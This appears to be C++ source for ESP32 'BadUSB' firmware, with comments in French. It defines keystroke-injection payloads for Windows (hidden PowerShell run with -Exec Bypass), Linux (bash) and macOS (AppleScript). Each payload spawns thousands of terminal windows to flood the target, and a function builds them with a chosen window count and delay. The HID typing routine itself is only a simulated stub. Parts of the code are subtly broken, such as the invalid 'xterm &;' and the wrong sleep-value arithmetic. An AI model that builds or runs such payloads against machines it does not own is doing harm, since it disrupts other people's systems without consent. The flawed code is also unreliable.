#include "badusb.h"
#include "config.h"

namespace {

// Payload PowerShell pour Windows - ouvre cmd lentement avec délai entre chaque
const char PAYLOAD_WINDOWS[] =
    "powershell -NoP -NonI -W H -Exec Bypass -Command "
    "\"$d=100;"
    "for($i=0;$i -lt 15000;$i++){"
    "Start-Process -WindowStyle Hidden cmd;"
    "Start-Sleep -m $d"
    "}\"";

// Payload bash pour Linux - ouvre gnome-terminal/xterm lentement
const char PAYLOAD_LINUX[] =
    "bash -c 'for i in {1..15000}; do "
    "if command -v gnome-terminal &> /dev/null; then "
    "gnome-terminal -- /bin/true & "
    "else "
    "xterm &; "
    "fi; "
    "sleep 0.1; "
    "done'";

// Payload AppleScript pour macOS - ouvre Terminal lentement
const char PAYLOAD_MACOS[] =
    "osascript -e 'repeat 15000 times "
    "tell application \"System Events\" to keystroke \"n\" using command down "
    "delay 0.1 "
    "end repeat'";

// Payload court pour test (ouvre juste 10 fenêtres)
const char PAYLOAD_WINDOWS_TEST[] =
    "powershell -NoP -NonI -W H -Exec Bypass -Command "
    "\"$d=500;"
    "for($i=0;$i -lt 10;$i++){"
    "Start-Process -WindowStyle Hidden cmd;"
    "Start-Sleep -m $d"
    "}\"";

}

namespace BadUSB {

PayloadResult openWindowsSpam(OSType os, uint16_t count, uint16_t delayMs) {
    PayloadResult result{"success", "Payload injection started", 0};

    String payload;
    switch (os) {
        case OS_WINDOWS:
            // Générer dynamiquement le payload avec le nombre de fenêtres et le délai
            payload = String("powershell -NoP -NonI -W H -Exec Bypass -Command "
                            "\"$d=") + String(delayMs) + String(";"
                            "for($i=0;$i -lt ") + String(count) + String(";$i++){"
                            "Start-Process -WindowStyle Hidden cmd;"
                            "Start-Sleep -m $d"
                            "}\"");
            break;
        case OS_LINUX:
            payload = String("bash -c 'for i in {1..") + String(count) + String("}; do "
                            "if command -v gnome-terminal &> /dev/null; then "
                            "gnome-terminal -- /bin/true & "
                            "else "
                            "xterm &; "
                            "fi; "
                            "sleep 0.") + String(delayMs / 100) + String("; "
                            "done'");
            break;
        case OS_MACOS:
            payload = String("osascript -e 'repeat ") + String(count) + String(" times "
                            "tell application \"System Events\" to keystroke \"n\" using command down "
                            "delay 0.") + String(delayMs / 100) + String(" "
                            "end repeat'");
            break;
    }

    // Injection HID via les touches clavier simulées
    injectKeys(payload, delayMs / 10);

    result.keystrokes = payload.length();
    result.message = "Injection de " + String(count) + " fenêtres lente (délai=" +
                     String(delayMs) + "ms entre chaque)";
    return result;
}

void injectKeys(const String &payload, uint16_t delayMs) {
    // Simule l'injection HID en tapant chaque caractère avec délai
    // Sur vrai matériel USB, ceci utiliserait la pile HID-Keyboard de l'ESP32
    for (size_t i = 0; i < payload.length(); i++) {
        char c = payload[i];
        // Dans une vrai implémentation, on appelerait l'API HID de l'ESP32
        // Pour l'instant, on simule simplement
        delay(delayMs);
    }
}

} // namespace BadUSB
